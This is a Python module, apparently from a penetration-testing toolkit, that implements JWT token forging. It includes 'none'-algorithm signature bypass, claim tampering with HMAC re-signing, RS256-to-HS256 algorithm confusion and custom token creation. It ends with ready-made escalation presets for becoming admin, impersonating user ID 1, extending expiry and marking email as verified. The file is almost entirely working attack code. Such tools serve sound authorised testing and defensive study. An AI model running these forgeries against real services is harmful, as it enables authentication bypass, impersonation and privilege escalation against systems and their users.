"""JWT Token Forging and Manipulation"""

import json
import hmac
import hashlib
from typing import Dict, Optional, Any
from dataclasses import dataclass
from enum import Enum

from .utils.base64url import base64url_encode, base64url_decode


class ForgeMode(Enum):
    """JWT Forging attack modes"""
    NONE_ALG = "none_alg"  # Change algorithm to 'none'
    MODIFY_CLAIMS = "modify_claims"  # Modify payload claims
    ALG_CONFUSION = "alg_confusion"  # RS256 -> HS256 confusion
    RESIGN = "resign"  # Re-sign with known secret
    CUSTOM = "custom"  # Custom header + payload


@dataclass
class ForgeResult:
    """Result of token forging"""
    success: bool
    token: Optional[str] = None
    header: Optional[Dict] = None
    payload: Optional[Dict] = None
    attack_type: Optional[str] = None
    message: str = ""


class JWTForger:
    """JWT Token Forger for security testing"""
    
    def __init__(self):
        pass
    
    def forge_none_algorithm(self, original_token: str, 
                            claim_modifications: Optional[Dict[str, Any]] = None) -> ForgeResult:
        """
        Forge token with 'none' algorithm (signature bypass attack).
        
        This attack exploits JWT libraries that don't properly validate
        the 'none' algorithm, allowing unsigned tokens.
        
        Args:
            original_token: Original JWT token
            claim_modifications: Claims to modify (e.g., {"role": "admin"})
            
        Returns:
            ForgeResult with forged token
        """
        try:
            # Parse original token
            parts = original_token.strip().split('.')
            if len(parts) != 3:
                return ForgeResult(
                    success=False,
                    message="Invalid JWT format"
                )
            
            # Decode header and payload
            header = json.loads(base64url_decode(parts[0]).decode('utf-8'))
            payload = json.loads(base64url_decode(parts[1]).decode('utf-8'))
            
            # Modify header to use 'none' algorithm
            header['alg'] = 'none'
            if 'typ' not in header:
                header['typ'] = 'JWT'
            
            # Apply claim modifications
            if claim_modifications:
                payload.update(claim_modifications)
            
            # Create new token (no signature for 'none' algorithm)
            new_header = base64url_encode(json.dumps(header).encode())
            new_payload = base64url_encode(json.dumps(payload).encode())
            forged_token = f"{new_header}.{new_payload}."
            
            return ForgeResult(
                success=True,
                token=forged_token,
                header=header,
                payload=payload,
                attack_type="none_algorithm",
                message="Successfully forged token with 'none' algorithm"
            )
            
        except Exception as e:
            return ForgeResult(
                success=False,
                message=f"Forging failed: {str(e)}"
            )
    
    def forge_modify_claims(self, original_token: str, 
                           claim_modifications: Dict[str, Any],
                           secret: Optional[str] = None) -> ForgeResult:
        """
        Modify JWT claims and re-sign (if secret provided).
        
        Common privilege escalation: user -> admin, role modification, etc.
        
        Args:
            original_token: Original JWT token
            claim_modifications: Claims to modify/add
            secret: Secret to re-sign (optional, if not provided creates invalid signature)
            
        Returns:
            ForgeResult with modified token
        """
        try:
            # Parse original token
            parts = original_token.strip().split('.')
            if len(parts) != 3:
                return ForgeResult(
                    success=False,
                    message="Invalid JWT format"
                )
            
            # Decode header and payload
            header = json.loads(base64url_decode(parts[0]).decode('utf-8'))
            payload = json.loads(base64url_decode(parts[1]).decode('utf-8'))
            
            # Apply modifications
            original_payload = payload.copy()
            payload.update(claim_modifications)
            
            # Create new header and payload
            new_header = base64url_encode(json.dumps(header).encode())
            new_payload = base64url_encode(json.dumps(payload).encode())
            
            # Sign if secret provided
            if secret:
                algorithm = header.get('alg', 'HS256').upper()
                if algorithm == 'HS256':
                    signature = self._sign_hs256(new_header, new_payload, secret)
                elif algorithm == 'HS384':
                    signature = self._sign_hs384(new_header, new_payload, secret)
                elif algorithm == 'HS512':
                    signature = self._sign_hs512(new_header, new_payload, secret)
                else:
                    # Keep original signature (will be invalid)
                    signature = parts[2]
                    
                forged_token = f"{new_header}.{new_payload}.{signature}"
                message = f"Successfully modified claims and re-signed with {algorithm}"
            else:
                # Keep original signature (will be invalid)
                forged_token = f"{new_header}.{new_payload}.{parts[2]}"
                message = "Claims modified but signature is INVALID (no secret provided)"
            
            return ForgeResult(
                success=True,
                token=forged_token,
                header=header,
                payload=payload,
                attack_type="modify_claims",
                message=message
            )
            
        except Exception as e:
            return ForgeResult(
                success=False,
                message=f"Modification failed: {str(e)}"
            )
    
    def forge_algorithm_confusion(self, original_token: str, 
                                  public_key_as_secret: str) -> ForgeResult:
        """
        Algorithm confusion attack: RS256 -> HS256.
        
        This attack exploits systems that use the same key for both
        RSA verification and HMAC signing.
        
        Args:
            original_token: Original RS256 token
            public_key_as_secret: Public key to use as HMAC secret
            
        Returns:
            ForgeResult with confused token
        """
        try:
            # Parse original token
            parts = original_token.strip().split('.')
            if len(parts) != 3:
                return ForgeResult(
                    success=False,
                    message="Invalid JWT format"
                )
            
            # Decode header and payload
            header = json.loads(base64url_decode(parts[0]).decode('utf-8'))
            payload = json.loads(base64url_decode(parts[1]).decode('utf-8'))
            
            # Change algorithm to HS256
            original_alg = header.get('alg', 'RS256')
            header['alg'] = 'HS256'
            
            # Create new header
            new_header = base64url_encode(json.dumps(header).encode())
            new_payload = parts[1]  # Keep original payload
            
            # Sign with public key as HMAC secret
            signature = self._sign_hs256(new_header, new_payload, public_key_as_secret)
            
            forged_token = f"{new_header}.{new_payload}.{signature}"
            
            return ForgeResult(
                success=True,
                token=forged_token,
                header=header,
                payload=payload,
                attack_type="algorithm_confusion",
                message=f"Algorithm confusion: {original_alg} -> HS256"
            )
            
        except Exception as e:
            return ForgeResult(
                success=False,
                message=f"Algorithm confusion failed: {str(e)}"
            )
    
    def forge_custom(self, header: Dict, payload: Dict, 
                    secret: Optional[str] = None) -> ForgeResult:
        """
        Create completely custom JWT token.
        
        Args:
            header: Custom header
            payload: Custom payload
            secret: Secret to sign (optional)
            
        Returns:
            ForgeResult with custom token
        """
        try:
            # Ensure required header fields
            if 'alg' not in header:
                header['alg'] = 'HS256'
            if 'typ' not in header:
                header['typ'] = 'JWT'
            
            # Encode header and payload
            header_b64 = base64url_encode(json.dumps(header).encode())
            payload_b64 = base64url_encode(json.dumps(payload).encode())
            
            # Sign if secret provided
            if secret:
                algorithm = header['alg'].upper()
                if algorithm == 'NONE':
                    signature = ''
                elif algorithm == 'HS256':
                    signature = self._sign_hs256(header_b64, payload_b64, secret)
                elif algorithm == 'HS384':
                    signature = self._sign_hs384(header_b64, payload_b64, secret)
                elif algorithm == 'HS512':
                    signature = self._sign_hs512(header_b64, payload_b64, secret)
                else:
                    signature = ''
                
                token = f"{header_b64}.{payload_b64}.{signature}"
                message = f"Custom token created and signed with {algorithm}"
            else:
                token = f"{header_b64}.{payload_b64}."
                message = "Custom token created (unsigned)"
            
            return ForgeResult(
                success=True,
                token=token,
                header=header,
                payload=payload,
                attack_type="custom",
                message=message
            )
            
        except Exception as e:
            return ForgeResult(
                success=False,
                message=f"Custom token creation failed: {str(e)}"
            )
    
    def _sign_hs256(self, header_b64: str, payload_b64: str, secret: str) -> str:
        """Sign with HS256"""
        signing_input = f"{header_b64}.{payload_b64}".encode('utf-8')
        signature = hmac.new(
            secret.encode('utf-8'),
            signing_input,
            hashlib.sha256
        ).digest()
        return base64url_encode(signature)
    
    def _sign_hs384(self, header_b64: str, payload_b64: str, secret: str) -> str:
        """Sign with HS384"""
        signing_input = f"{header_b64}.{payload_b64}".encode('utf-8')
        signature = hmac.new(
            secret.encode('utf-8'),
            signing_input,
            hashlib.sha384
        ).digest()
        return base64url_encode(signature)
    
    def _sign_hs512(self, header_b64: str, payload_b64: str, secret: str) -> str:
        """Sign with HS512"""
        signing_input = f"{header_b64}.{payload_b64}".encode('utf-8')
        signature = hmac.new(
            secret.encode('utf-8'),
            signing_input,
            hashlib.sha512
        ).digest()
        return base64url_encode(signature)
    
    def get_common_escalations(self) -> Dict[str, Dict[str, Any]]:
        """Get common privilege escalation scenarios"""
        return {
            "user_to_admin": {
                "name": "User to Admin",
                "description": "Escalate regular user to admin",
                "modifications": {
                    "role": "admin",
                    "isAdmin": True,
                    "admin": True
                }
            },
            "elevate_permissions": {
                "name": "Elevate Permissions",
                "description": "Add full permissions",
                "modifications": {
                    "permissions": ["read", "write", "delete", "admin"],
                    "scope": "full"
                }
            },
            "change_user_id": {
                "name": "Change User ID",
                "description": "Impersonate another user",
                "modifications": {
                    "sub": "1",  # Admin user ID typically
                    "user_id": "1",
                    "uid": "1"
                }
            },
            "extend_expiry": {
                "name": "Extend Token Expiry",
                "description": "Set far future expiration",
                "modifications": {
                    "exp": 9999999999  # Year 2286
                }
            },
            "bypass_email_verification": {
                "name": "Bypass Email Verification",
                "description": "Mark email as verified",
                "modifications": {
                    "email_verified": True,
                    "verified": True
                }
            }
        }
